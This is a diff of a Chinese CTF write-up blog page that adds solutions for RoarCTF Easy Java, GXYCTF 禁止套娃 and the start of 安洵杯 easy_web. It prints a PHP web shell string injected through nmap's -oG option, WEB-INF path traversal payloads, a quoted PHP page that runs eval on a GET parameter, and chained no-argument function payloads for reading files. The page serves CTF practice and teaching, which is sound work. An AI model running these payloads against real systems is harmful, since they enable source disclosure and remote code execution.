@@ -28,7 +28,7 @@
 <meta property="og:description" content="BUUCTF 2018 Online Tool123456789101112131415161718&lt;?phpif (isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])) &amp;#123;    $_SERVER[&#39;REMOTE_ADDR&#39;] &#x3D; $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2021-03-15T11:50:36.000Z">
-<meta property="article:modified_time" content="2021-03-15T12:25:15.395Z">
+<meta property="article:modified_time" content="2021-03-17T07:05:42.807Z">
 <meta property="article:author" content="六公子买单">
 <meta property="article:tag" content="二刷buu">
 <meta name="twitter:card" content="summary">
@@ -173,10 +173,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
-              
 
-              <time title="Created: 2021-03-15 19:50:36 / Modified: 20:25:15" itemprop="dateCreated datePublished" datetime="2021-03-15T19:50:36+08:00">2021-03-15</time>
+              <time title="Created: 2021-03-15 19:50:36" itemprop="dateCreated datePublished" datetime="2021-03-15T19:50:36+08:00">2021-03-15</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-03-17 15:05:42" itemprop="dateModified" datetime="2021-03-17T15:05:42+08:00">2021-03-17</time>
+              </span>
 
           
 
@@ -199,6 +205,35 @@
 <p>不是命令，而是一个字符串，因为在解析单引号的时候 , 被单引号包裹的内容中如果有变量 , 这个变量名是不会被解析成值的，但是双引号不同 , bash 会将变量名解析成变量的值再使用。</p>
 <p>2.引号旁边加空格是因为，如果不加，当两个函数执行并echo出来后就会变成：</p>
 <pre><code>\&lt;?php eval($_POST[&quot;v&quot;]);?&gt; -oG shell.php\\</code></pre>
+<hr>
+<h2 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h2><p>WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。WEB-INF主要包含一下文件或目录:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;WEB-INF&#x2F;web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</span><br><span class="line"></span><br><span class="line">&#x2F;WEB-INF&#x2F;classes&#x2F;：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中</span><br><span class="line">&#x2F;WEB-INF&#x2F;lib&#x2F;：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</span><br><span class="line">&#x2F;WEB-INF&#x2F;src&#x2F;：源码目录，按照包名结构放置各个java文件。</span><br><span class="line"></span><br><span class="line">&#x2F;WEB-INF&#x2F;database.properties：数据库配置文件</span><br><span class="line"></span><br><span class="line">漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码</span><br></pre></td></tr></table></figure>
+<p>payload:</p>
+<pre><code>/Download?filename=WEB-INF/web.xml</code></pre>
+<p>BP抓包，要用POST方法，漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码</p>
+<p>回显  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;servlet&gt;</span><br><span class="line">       &lt;servlet-name&gt;FlagController&lt;&#x2F;servlet-name&gt;</span><br><span class="line">       &lt;servlet-class&gt;com.wm.ctf.FlagController</span><br><span class="line">       &lt;&#x2F;servlet-class&gt;</span><br></pre></td></tr></table></figure>
+<p>结合tomcat的项目存放路径经验试试下载FlagController.class</p>
+<p>最终payload</p>
+<pre><code>?filename=WEB-INF/classes/com/wm/ctf/FlagController.class</code></pre>
+<hr>
+<h2 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h2><p>剽的大佬的blog <a target="_blank" rel="noopener" href="https://blog.csdn.net/r1727337824/article/details/108293359">https://blog.csdn.net/r1727337824/article/details/108293359</a></p>
+<p>git泄露,在Githack打开终端，</p>
+<pre><code>python Githack.py http://3d1f6c86-9f4b-443e-9714-0ca2673fe1c1.node3.buuoj.cn/.git/</code></pre>
+<p>文件夹中多了一个index.php文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">echo &quot;flag在哪里呢？&lt;br&gt;&quot;;</span><br><span class="line">if(isset($_GET[&#39;exp&#39;]))&#123;  &#x2F;&#x2F;传参exp</span><br><span class="line">    if (!preg_match(&#39;&#x2F;data:\&#x2F;\&#x2F;|filter:\&#x2F;\&#x2F;|php:\&#x2F;\&#x2F;|phar:\&#x2F;\&#x2F;&#x2F;i&#39;, $_GET[&#39;exp&#39;]))   &#x2F;&#x2F;过滤了常用的伪协议</span><br><span class="line">    &#123;</span><br><span class="line">        if(&#39;;&#39; &#x3D;&#x3D;&#x3D; preg_replace(&#39;&#x2F;[a-z,_]+\((?R)?\)&#x2F;&#39;, NULL, $_GET[&#39;exp&#39;])) &#x2F;&#x2F;在得到的exp参数中匹配 [a-z,_]+((?R)?) 并转化为空，注意这里有(?R)?递归调用限制我们传入的参数只能是无参数函数或者是套函数，就是说假如我们传入参数为 exp&#x3D;system(&#39;ls&#39;);则匹配不成功;</span><br><span class="line">        &#123;</span><br><span class="line">            if (!preg_match(&#39;&#x2F;et|na|info|dec|bin|hex|oct|pi|log&#x2F;i&#39;, $_GET[&#39;exp&#39;])) </span><br><span class="line">            &#123;</span><br><span class="line">                &#x2F;&#x2F; echo $_GET[&#39;exp&#39;];</span><br><span class="line">                @eval($_GET[&#39;exp&#39;]);</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                die(&quot;还差一点哦！&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            die(&quot;再好好想想！&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die(&quot;还想读flag，臭弟弟！&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>关于第二个过滤：</p>
+<p>假如我们传入exp=print_r(scandir(pos(localeconv())));因为匹配成功所以函数localeconv(),pos(),scandir(),print_r()用NULL替换后为；从而可以进入if从句。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">函数扩展：</span><br><span class="line">scandir(’.’):扫描当前目录</span><br><span class="line">localeconv() 函数返回一包含本地数字及货币格式信息的数组。而数组第一项就是.</span><br><span class="line">pos(),current():返回数组第一个值</span><br></pre></td></tr></table></figure>
+<pre><code>    exp=print_r(scandir(pos(localeconv())));</code></pre>
+<p>数组操作函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">end():数组指针指向最后一位</span><br><span class="line">next(): 数组指针指向下一位</span><br><span class="line">array_reverse(): 将数组颠倒</span><br><span class="line">array_rand(): 随机返回数组的键名</span><br><span class="line">array_flip()：交换数组的键和值</span><br></pre></td></tr></table></figure>
+<p>读取文件函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">file_get_content() :因为et被ban，所以不能使用</span><br><span class="line">readfile()</span><br><span class="line">highlight_file()</span><br><span class="line">show_source()</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exp&#x3D;show_source(next(array_reverse(scandir(pos(localeconv())))));&#x2F;&#x2F;反转数组顺序读取第二个元素内容（这种方法只能读取第二个或倒数第二个）</span><br><span class="line">exp&#x3D;show_source(array_rand(array_flip(scandir(pos(localeconv())))));&#x2F;&#x2F;随机返回数组的键名</span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h2><p>url中img经过两次base64解码，一次hex解码得55.png</p>
+<p>要访问index.php，需要同样编码</p>
 
     </div>
 
@@ -282,7 +317,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#BUUCTF-2018-Online-Tool"><span class="nav-number">1.</span> <span class="nav-text">BUUCTF 2018 Online Tool</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#BUUCTF-2018-Online-Tool"><span class="nav-number">1.</span> <span class="nav-text">BUUCTF 2018 Online Tool</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RoarCTF-2019-Easy-Java"><span class="nav-number">2.</span> <span class="nav-text">[RoarCTF 2019]Easy Java</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GXYCTF2019-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83"><span class="nav-number">3.</span> <span class="nav-text">[GXYCTF2019]禁止套娃</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-web"><span class="nav-number">4.</span> <span class="nav-text">[安洵杯 2019]easy_web</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -296,7 +331,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">19</span>
+          <span class="site-state-item-count">20</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -305,7 +340,7 @@
         <span class="site-state-item-name">categories</span>
       </div>
       <div class="site-state-item site-state-tags">
-        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-count">14</span>
         <span class="site-state-item-name">tags</span>
       </div>
   </nav>
